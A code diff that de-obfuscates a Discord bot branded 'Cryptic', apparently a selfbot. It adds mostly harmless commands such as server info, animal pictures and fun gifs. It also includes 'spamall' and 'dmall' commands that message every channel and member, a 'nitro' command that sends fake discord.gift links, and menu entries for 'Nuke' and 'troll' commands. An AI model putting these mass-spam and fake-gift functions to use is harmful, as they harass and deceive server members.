+    const idle = message.guild.members.filter(user => user.presence.status == "idle").size
+    const online = message.guild.members.filter(user => user.presence.status == "online").size
+    const offline = message.guild.members.filter(user => user.presence.status == "offline").size
+    const streaming = message.guild.members.filter(user => user.presence.status == "streaming").size
+    const txt = message.guild.channels.filter(channel => channel.type == "text").size
+    const voice = message.guild.channels.filter(channel => channel.type == "voice").size
+    const category = message.guild.channels.filter(channel => channel.type == "category").size
+    const bots = message.guild.members.filter(m => m.user.bot).size
+    const Members = message.guild.members.filter(m => m.user).size - message.guild.members.filter(m => m.user.bot).size
+    //Create the embed
+    if(enabled === true) {
+        let Embed = new Discord.RichEmbed()
+        .setColor(color ? color : "#1B78E7")
+        .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+        .setTitle(`${message.guild.name} info`)
+        .setThumbnail(message.guild.iconURL)
+        .addField("Guild Name", message.guild.name, true)
+        .addField("Guild Name Acronym", message.guild.nameAcronym, true)
+        .addField("Guild Owner", `<@!${message.guild.ownerID}>`, true)
+        .addField("Members", `
+        Total: ${message.guild.members.size.toLocaleString()}
+        Humans: ${Members.toLocaleString()}
+        Bots: ${bots.toLocaleString()}
+        `, true)
+        .addField("Member Presence", `
+        Do Not Disturb: ${dnd.toLocaleString()}
+        Idle: ${idle.toLocaleString()}
+        Online: ${online.toLocaleString()}
+        Offline: ${offline.toLocaleString()}
+        Streaming: ${streaming.toLocaleString()}
+        `, true)
+        .addField("Guild Region", message.guild.region, true)
+        .addField("Guild created at", moment(message.guild.createdAt).format('MMMM Do YYYY, h:mm A') + " | " + moment(message.guild.createdAt).startOf().fromNow(), true)
+        .addField("Guild ID", message.guild.id, true)
+        .addField("Total Boosts", message.guild.premiumSubscriptionCount, true)
+        .addField("Boost Level", message.guild.premiumTier, true)
+        .addField("Total Emojis", message.guild.emojis.size, true)
+        .addField("Channels", `
+        Total: ${message.guild.channels.size.toLocaleString()}
+        Text: ${txt.toLocaleString()}
+        Voice: ${voice.toLocaleString()}
+        Categories: ${category.toLocaleString()}
+        `, true)
+        .addField("Verification Level", message.guild.verificationLevel, true)
+        if(message.guild.roles.size < 20){
+            Embed.addField(`[${message.guild.roles.size.toLocaleString()}] Total Roles`, role2)
+        }else{
+            Embed.addField(`[${message.guild.roles.size.toLocaleString()}] Total Roles`, role + `... and ${RoleAmount} more!`)
+        }
+        Embed.setTimestamp()
+        message.channel.send(Embed);
+    } else {
+        message.channel.send(`\`\`\`Guild Name: ${message.guild.name}
+Guild Name Acronym: ${message.guild.nameAcronym}
+Guild Owner: ${message.guild.owner.user.tag}
+Members:
+    Total: ${message.guild.members.size.toLocaleString()}
+    Humans: ${Members.toLocaleString()}
+    Bots: ${bots.toLocaleString()}
+Member Presence:
+    Do Not Disturb: ${dnd.toLocaleString()}
+    Idle: ${idle.toLocaleString()}
+    Online: ${online.toLocaleString()}
+    Offline: ${offline.toLocaleString()}
+    Streaming: ${streaming.toLocaleString()}
+Guild Region: ${message.guild.region}
+Guild created at: ${moment(message.guild.createdAt).format('MMMM Do YYYY, h:mm A')} | ${moment(message.guild.createdAt).startOf().fromNow()}
+Guild ID: ${message.guild.id}
+Total Boosts: ${message.guild.premiumSubscriptionCount}
+Boost Level: ${message.guild.premiumTier}
+Total Emojis: ${message.guild.emojis.size}
+Channels:
+    Total ${message.guild.channels.size.toLocaleString()}
+    Text: ${txt.toLocaleString()}
+    Voice: ${voice.toLocaleString}
+    Categories: ${category.toLocaleString()}
+Verification Level: ${message.guild.verificationLevel}
+Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${footer}` : null}\`\`\``)
+    }
+    }
+
+    if(cmd === "empty") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        message.channel.send("​")
+    }
+
+    if(cmd === "nitro") {
+    console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+      if(message.deletable) {
+        message.delete()
+      }
+      function nitroCode() {
+        let code = "";
+        let dict = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        for (var i = 0; i < 19; i++) {
+            code = code + dict.charAt(Math.floor(Math.random() * dict.length));
+        }
+        return code;
+      }
+      message.channel.send(`https://discord.gift/${nitroCode()}`)
+    }
+
+    if(cmd === "dog") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get(`https://some-random-api.ml/img/dog`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Random dog image")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setImage(body.link)
+            message.channel.send(embed);
+        } else {
+            let img = new Discord.Attachment(body.link, "dog.png")
+            message.channel.send(img)
+        }
+    }
+
+    if(cmd === "cat") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get(`https://some-random-api.ml/img/cat`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Random cat image")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setImage(body.link)
+            message.channel.send(embed);
+        } else {
+            let img = new Discord.Attachment(body.link, "cat.png")
+            message.channel.send(img)
+        }
+    }
+
+    if(cmd === "fox") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get(`https://some-random-api.ml/img/fox`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Random fox image")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setImage(body.link)
+            message.channel.send(embed);
+        } else {
+            let img = new Discord.Attachment(body.link, "fox.png")
+            message.channel.send(img)
+        }
+    }
+
+    if(cmd === "foxfact") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get(`https://some-random-api.ml/facts/fox`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        message.channel.send(body.fact);
+    }
+
+    if(cmd === "dogfact") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get(`https://some-random-api.ml/facts/dog`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        message.channel.send(body.fact);
+    }
+
+    if(cmd === "catfact") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get(`https://some-random-api.ml/facts/cat`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        message.channel.send(body.fact);
+    }
+
+    if(cmd === "wink") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const user = message.mentions.users.first();
+        if(!user) return message.channel.send("Please mention a user.")
+        const {body} = await superagent.get(`https://some-random-api.ml/animu/wink`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setDescription(`${message.author} winks at ${user}`)
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setImage(body.link)
+            message.channel.send(embed);
+        } else {
+            let img = new Discord.Attachment(body.link, "wink.png")
+            message.channel.send(`${message.author.username} winks at ${user.username}`, img)
+        }
+    }
+
+    if(cmd === "pat") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const user = message.mentions.users.first();
+        if(!user) return message.channel.send("Please mention a user.")
+        const {body} = await superagent.get(`https://some-random-api.ml/animu/pat`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setDescription(`${message.author} pats ${user}`)
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setImage(body.link)
+            message.channel.send(embed);
+        } else {
+            let img = new Discord.Attachment(body.link, "pat.png")
+            message.channel.send(`${message.author.username} pats ${user.username}`, img)
+        }
+    }
+
+    if(cmd === "hug") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const user = message.mentions.users.first();
+        if(!user) return message.channel.send("Please mention a user.")
+        const {body} = await superagent.get(`https://some-random-api.ml/animu/hug`)
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setDescription(`${message.author}  hugs ${user}`)
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setImage(body.link)
+            message.channel.send(embed);
+        } else {
+            let img = new Discord.Attachment(body.link, "hug.png")
+            message.channel.send(`${message.author.username} hugs ${user.username}`, img)
+        }
+    }
+
+    if(cmd === "randomtoken") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get("https://some-random-api.ml/bottoken")
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        message.channel.send(body.token)
+    }
+
+    if(cmd === "meme") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const {body} = await superagent.get("https://some-random-api.ml/meme")
+        if(!body) return message.channel.send("Uh oh, it looks like that there was no body to load. Please try again.")
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle(body.caption)
+            .setImage(body.image)
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            message.channel.send(embed)
+        } else {
+            let img = new Discord.Attachment(body.image, "meme.png")
+            message.channel.send(body.caption, img)
+        }
+    }
+
+    if(cmd === "base64") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args[0]) return message.channel.send("Uknown parameter. Please choose the method first, either decode or encode it");
+    
+        const method = ["encode", "decode"];
+        if(!method.includes(args[0].toLowerCase())) return message.channel.send("Uknown parameter. Please choose the method first, either decode or encode it");
+    
+        let msg = args.slice(1).join(" ");
+    
+        if(!msg) return message.channel.send("Please provide some text");
+    
+        if(msg.length > 1024) return message.channel.send("Your text is to long. The maximum amount of characters is `1,024`");
+    
+        if(args[0].toLowerCase() === method[0]) {
+            const {body} = await superagent.get(`https://some-random-api.ml/base64?encode=${msg}`)
+            return message.channel.send(body.base64);
+        } else if(args[0].toLowerCase() === method[1]) {
+            const {body} = await superagent.get(`https://some-random-api.ml/base64?decode=${msg}`)
+            return message.channel.send(body.text);
+        }
+        }
+    
+    if(cmd === "spamall") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please provide a message.")
+        message.guild.channels.filter(ch => ch.type === "text").forEach(ch => {
+            console.log(colors.green(`[+] Message sent to #${ch.name}`))
+            ch.send(args.join(" ")).catch(err => {
+                return console.log(colors.red(`[-] Message couldn't send to #${ch.name}`))
+            })
+        })
+    }
+
+    if(cmd === "dmall") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please provide a message.")
+        message.guild.members.forEach((member) => {
+            try {
+                member.send(args.join(" ")).catch((err) => {
+                    return console.log(colors.red(`[-] Couldn't send message to ${member.user.tag}`))
+                })
+                console.log(colors.green(`[+] Message sent to ${member.user.tag}`))
+            } catch(err) {
+                return console.log(colors.red(`[-] Couldn't send message to ${member.user.tag}`))
+            }
+        })
+    }
+
+    if(cmd === "cembed") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(!args.join(" ")) return message.channel.send("Please specify some text!")
+        const options = message.content.slice(7).split(" | ")
+        let embed = new Discord.RichEmbed()
+        if(options[0]) embed.setTitle(options[0])
+        if(options[1]) embed.setDescription(options[1])
+        if(options[2]) embed.setColor(`0x${options[2]}`)
+        if(options[3]) embed.setFooter(options[3])
+        if(options[5]) embed.setAuthor(options[5])
+        if(options[6]) embed.setThumbnail(options[6])
+        message.channel.send(embed)
+    }
+
+    if(cmd === "fun") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            const description = stripIndents`<> = required | [] = optional
+
+            **${prefix}8ball <question>** » Asks the 8ball a question of your choice
+            **${prefix}avatar [user]** » Gets the avatar from the mentioned user
+            **${prefix}cb <message>** » Talk to yourself as if it's a chat bot
+            **${prefix}hug <user>** » Random anime hugging gif
+            **${prefix}meme** » Sends a fresh meme of the internet
+            **${prefix}ping** » Shows the message and the websocket latency
+            **${prefix}pat <user>** » Random anime patting gif
+            **${prefix}randomtoken** » Generates a random invalid discord bot token
+            **${prefix}uptime** » Shows how long the bot has been currently been running for
+            **${prefix}wink <user>** » Random anime winking gif`
+            let embed = new Discord.RichEmbed()
+            .setTitle("Fun Commands")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            if(description.length < 2000) {
+                embed.setDescription(description)
+            } else {
+                const {body} = await post("https://hastebin.com/documents").send(description)
+                embed.setDescription(`The list was to big, click this link to view all commands:\n**https://hastebin.com/${body.key}**`)
+            }
+        message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             Fun Commands
 
             <> = required | [] = optional
 
-            ${_0x32f547}8ball <question> » Asks the 8ball a question of your choice
-            ${_0x32f547}avatar [user] » Gets the avatar from the mentioned user
-            ${_0x32f547}cb <message> » Talk to yourself as if it's a chat bot
-            ${_0x32f547}hug <user> » Random anime hugging gif
-            ${_0x32f547}meme » Sends a fresh meme of the internet
-            ${_0x32f547}ping » Shows the message and the websocket latency
-            ${_0x32f547}pat <user> » Random anime patting gif
-            ${_0x32f547}randomtoken » Generates a random invalid discord bot token
-            ${_0x32f547}uptime » Shows how long the bot has been currently been running for
-            ${_0x32f547}wink <user> » Random anime winking gif${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x546,0x4de)){console[_0x1be328(0x6da,0x7ed)]('['+colors[_0x1be328(0x57b,0x593)](moment()['utc']()[_0x1be328(0x6ed,0x824)](_0x1be328(0x5fa,0x780)))+']\x20'+colors[_0x1be328(0x632,0x6a5)](_0x1be328(0x596,0x4f3))+'\x20'+colors[_0x1be328(0x5db,0x747)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x629)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x690)]&&_0x1b369a[_0x1be328(0x594,0x455)]();if(enabled===!![]){let _0x35554c=new Discord[(_0x1be328(0x508,0x45a))]()[_0x1be328(0x4a2,0x51a)](_0x1be328(0x6dd,0x7a6))[_0x1be328(0x5d3,0x5f1)](image?image:_0x1be328(0x56d,0x5ae))[_0x1be328(0x5aa,0x611)](color?color:_0x1be328(0x4c1,0x3f5))[_0x1be328(0x69b,0x75d)](footer?footer:_0x1be328(0x524,0x5e3))[_0x1be328(0x76c,0x786)](_0x1be328(0x5b2,0x4b0)+_0x32f547+_0x1be328(0x551,0x517)+_0x32f547+_0x1be328(0x6e1,0x604)+_0x32f547+_0x1be328(0x67c,0x4eb)+_0x32f547+_0x1be328(0x4ac,0x504)+_0x32f547+_0x1be328(0x62f,0x6ce)+_0x32f547+_0x1be328(0x59b,0x577)+_0x32f547+_0x1be328(0x4a9,0x4ff)+_0x32f547+_0x1be328(0x651,0x7d9)+_0x32f547+_0x1be328(0x610,0x6e5)+_0x32f547+_0x1be328(0x53c,0x682)+_0x32f547+_0x1be328(0x542,0x505)+_0x32f547+'msg\x20<bold|italics|underline|destroy|upper|lower|strikethrough|hidden|everything>\x20<message>**\x20»\x20Sends\x20your\x20message\x20in\x20different\x20forms\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20');_0x1b369a[_0x1be328(0x49d,0x3be)][_0x1be328(0x4c0,0x57d)](_0x35554c);}else _0x1b369a[_0x1be328(0x49d,0x507)][_0x1be328(0x4c0,0x441)](stripIndents`\`\`\`
+            ${prefix}8ball <question> » Asks the 8ball a question of your choice
+            ${prefix}avatar [user] » Gets the avatar from the mentioned user
+            ${prefix}cb <message> » Talk to yourself as if it's a chat bot
+            ${prefix}hug <user> » Random anime hugging gif
+            ${prefix}meme » Sends a fresh meme of the internet
+            ${prefix}ping » Shows the message and the websocket latency
+            ${prefix}pat <user> » Random anime patting gif
+            ${prefix}randomtoken » Generates a random invalid discord bot token
+            ${prefix}uptime » Shows how long the bot has been currently been running for
+            ${prefix}wink <user> » Random anime winking gif${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "text") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Text Commands")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`
             <> = required | [] = optional
 
-            ${_0x32f547}1337 <text> » Speak 1337
-            ${_0x32f547}ascii <text> » Converts your message to ascii
-            ${_0x32f547}binary <encode|decode> <message|binary> » Encodes/decodes binary
-            ${_0x32f547}base64 <encode|decode> <message|base64> » Encodes/decodes base64
-            ${_0x32f547}cembed <options> » Talk to yourself as if it's a chat bot
-            ${_0x32f547}embed <message> » Sends an embed with your text
-            ${_0x32f547}empty » Sends an empty message
-            ${_0x32f547}emojify <text> » Converts your text to emojis
-            ${_0x32f547}reverse <message> » Reverses your message
-            ${_0x32f547}say <message> » Says what ever you want
-            ${_0x32f547}spolier <message> » Converts your text to a spoiler
-            ${_0x32f547}msg <bold|italics|underline|destroy|upper|lower|strikethrough|hidden|everything> <message> » Sends your message in different forms${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85==='1337'){console[_0x1be328(0x6da,0x676)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x5f4)]()[_0x1be328(0x6ed,0x5db)](_0x1be328(0x5fa,0x4ec)))+']\x20'+colors[_0x1be328(0x632,0x4af)]('Command\x20used')+'\x20'+colors[_0x1be328(0x5db,0x6ae)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4db)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x732)]&&_0x1b369a[_0x1be328(0x594,0x489)]();const _0x1dc05d=_0x1748bb[_0x1be328(0x5c6,0x4ff)]('\x20');if(!_0x1dc05d)return _0x1b369a[_0x1be328(0x49d,0x329)][_0x1be328(0x4c0,0x41d)](_0x1be328(0x64b,0x4e4));const _0x5d035e=_0x1dc05d[_0x1be328(0x4b4,0x4e3)]('a','4')[_0x1be328(0x4b4,0x5b9)]('A','4')[_0x1be328(0x4b4,0x334)]('e','3')[_0x1be328(0x4b4,0x57d)]('E','3')[_0x1be328(0x4b4,0x587)]('i','!')[_0x1be328(0x4b4,0x374)]('I','!')[_0x1be328(0x4b4,0x4eb)]('o','0')[_0x1be328(0x4b4,0x371)]('O','0')[_0x1be328(0x4b4,0x545)]('u','|_|')[_0x1be328(0x4b4,0x507)]('U',_0x1be328(0x5b7,0x722));_0x1b369a[_0x1be328(0x49d,0x4df)][_0x1be328(0x4c0,0x337)](_0x5d035e);}if(_0x390a85===_0x1be328(0x555,0x46d)){console[_0x1be328(0x6da,0x773)]('['+colors[_0x1be328(0x57b,0x41e)](moment()[_0x1be328(0x4bf,0x340)]()[_0x1be328(0x6ed,0x5ae)](_0x1be328(0x5fa,0x73c)))+']\x20'+colors[_0x1be328(0x632,0x51f)](_0x1be328(0x596,0x5c3))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x5ac)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x7f5)]&&_0x1b369a[_0x1be328(0x594,0x6e5)]();if(enabled===!![]){let _0xaca7e=new Discord['RichEmbed']()[_0x1be328(0x4a2,0x58a)](_0x1be328(0x5f6,0x551))[_0x1be328(0x5d3,0x6f9)](image?image:_0x1be328(0x56d,0x69a))[_0x1be328(0x5aa,0x6d1)](color?color:_0x1be328(0x4c1,0x3ec))[_0x1be328(0x69b,0x5ff)](footer?footer:_0x1be328(0x524,0x5d7))[_0x1be328(0x76c,0x7e6)](_0x1be328(0x5b2,0x6f4)+_0x32f547+_0x1be328(0x576,0x507)+_0x32f547+_0x1be328(0x591,0x640)+_0x32f547+_0x1be328(0x5c2,0x751)+_0x32f547+_0x1be328(0x4cb,0x3c8)+_0x32f547+_0x1be328(0x608,0x72d)+_0x32f547+_0x1be328(0x58c,0x6f4));_0x1b369a[_0x1be328(0x49d,0x450)]['send'](_0xaca7e);}else _0x1b369a[_0x1be328(0x49d,0x3b0)][_0x1be328(0x4c0,0x4ff)](stripIndents`\`\`\`
+            **${prefix}1337 <text>** » Speak 1337
+            **${prefix}ascii <text>** » Converts your message to ascii
+            **${prefix}binary <encode|decode> <message|binary>** » Encodes/decodes binary
+            **${prefix}base64 <encode|decode> <message|base64>** » Encodes/decodes base64
+            **${prefix}cembed <options>** » Talk to yourself as if it's a chat bot
+            **${prefix}embed <message>** » Sends an embed with your text
+            **${prefix}empty** » Sends an empty message
+            **${prefix}emojify <text>** » Converts your text to emojis
+            **${prefix}reverse <message>** » Reverses your message
+            **${prefix}say <message>** » Says what ever you want
+            **${prefix}spolier <message>** » Converts your text to a spoiler
+            **${prefix}msg <bold|italics|underline|destroy|upper|lower|strikethrough|hidden|everything> <message>** » Sends your message in different forms
+            `)
+            message.channel.send(embed)
+        } else {
+            message.channel.send(stripIndents`\`\`\`
             <> = required | [] = optional
 
-            ${_0x32f547}clean <amount> » Deletes the specified amount of your messages
-            ${_0x32f547}codeblock <type> <code> » Converts your text to a code block
-            ${_0x32f547}eval <code> » Evaluates JavaScript code
-            ${_0x32f547}massreact <message> » Sends your message to a haste bin
-            ${_0x32f547}snipe [page-num] » Snipes the recently deleted message${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x5b1,0x552)){console[_0x1be328(0x6da,0x55e)]('['+colors[_0x1be328(0x57b,0x50c)](moment()[_0x1be328(0x4bf,0x416)]()[_0x1be328(0x6ed,0x807)](_0x1be328(0x5fa,0x766)))+']\x20'+colors[_0x1be328(0x632,0x647)](_0x1be328(0x596,0x420))+'\x20'+colors[_0x1be328(0x5db,0x66a)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4e4)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x63b)]&&_0x1b369a[_0x1be328(0x594,0x463)]();if(enabled===!![]){let _0x49f400=new Discord[(_0x1be328(0x508,0x5c0))]()[_0x1be328(0x4a2,0x5ed)](_0x1be328(0x74c,0x5c1))[_0x1be328(0x5d3,0x4f8)](image?image:_0x1be328(0x56d,0x4b1))[_0x1be328(0x5aa,0x62b)](color?color:_0x1be328(0x4c1,0x40c))[_0x1be328(0x69b,0x5f2)](footer?footer:_0x1be328(0x524,0x631))[_0x1be328(0x76c,0x7a9)](_0x1be328(0x5b2,0x50c)+_0x32f547+_0x1be328(0x492,0x61b)+_0x32f547+_0x1be328(0x65a,0x771)+_0x32f547+_0x1be328(0x757,0x6f0)+_0x32f547+_0x1be328(0x74a,0x8a4)+_0x32f547+_0x1be328(0x47f,0x58c)+_0x32f547+_0x1be328(0x750,0x715)+_0x32f547+_0x1be328(0x6d4,0x5d3)+_0x32f547+_0x1be328(0x77d,0x8b7)+_0x32f547+_0x1be328(0x692,0x653)+_0x32f547+_0x1be328(0x57f,0x40c)+_0x32f547+_0x1be328(0x484,0x5a0));_0x1b369a[_0x1be328(0x49d,0x514)][_0x1be328(0x4c0,0x569)](_0x49f400);}else _0x1b369a[_0x1be328(0x49d,0x413)][_0x1be328(0x4c0,0x64b)](stripIndents`\`\`\`
+            ${prefix}1337 <text> » Speak 1337
+            ${prefix}ascii <text> » Converts your message to ascii
+            ${prefix}binary <encode|decode> <message|binary> » Encodes/decodes binary
+            ${prefix}base64 <encode|decode> <message|base64> » Encodes/decodes base64
+            ${prefix}cembed <options> » Talk to yourself as if it's a chat bot
+            ${prefix}embed <message> » Sends an embed with your text
+            ${prefix}empty » Sends an empty message
+            ${prefix}emojify <text> » Converts your text to emojis
+            ${prefix}reverse <message> » Reverses your message
+            ${prefix}say <message> » Says what ever you want
+            ${prefix}spolier <message> » Converts your text to a spoiler
+            ${prefix}msg <bold|italics|underline|destroy|upper|lower|strikethrough|hidden|everything> <message> » Sends your message in different forms${footer ? `\n\n${footer}` : null}
+            \`\`\``)
+        }
+    }
+
+    if(cmd === "1337") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        const text = args.join(" ")
+        if(!text) return message.channel.send("Please specify some text to speak in 1337")
+        const newtext = text
+                        .replace("a", "4")
+                        .replace("A", "4")
+                        .replace("e", "3")
+                        .replace("E", "3")
+                        .replace("i", "!")
+                        .replace("I", "!")
+                        .replace("o", "0")
+                        .replace("O", "0")
+                        .replace("u", "|_|")
+                        .replace("U", "|_|");
+        message.channel.send(newtext)
+    }
+
+    if(cmd === "utility") {
+        console.log(`[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan("Command used")} ${colors.magenta("|")} ${colors.yellow(cmd)}`)
+        if(message.deletable) {
+            message.delete()
+        }
+        if(enabled === true) {
+            let embed = new Discord.RichEmbed()
+            .setTitle("Utility Commands")
+            .setThumbnail(image ? image : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif")
+            .setColor(color ? color : "#1B78E7")
+            .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘")
+            .setDescription(`
             <> = required | [] = optional
 
-            ${_0x32f547}animals » Animals Commands
-            ${_0x32f547}account » Account Commands
-            ${_0x32f547}abusive » Nuke Commands
-            ${_0x32f547}fun » Fun Commands
-            ${_0x32f547}info » Info Commands
-            ${_0x32f547}moderation » Moderation Commands
-            ${_0x32f547}status » Status Commands
-            ${_0x32f547}troll » Troll Commands
-            ${_0x32f547}face » Face Commands
-            ${_0x32f547}utility » Utility Commands${footer?'\x0a\x0a'+footer:null}
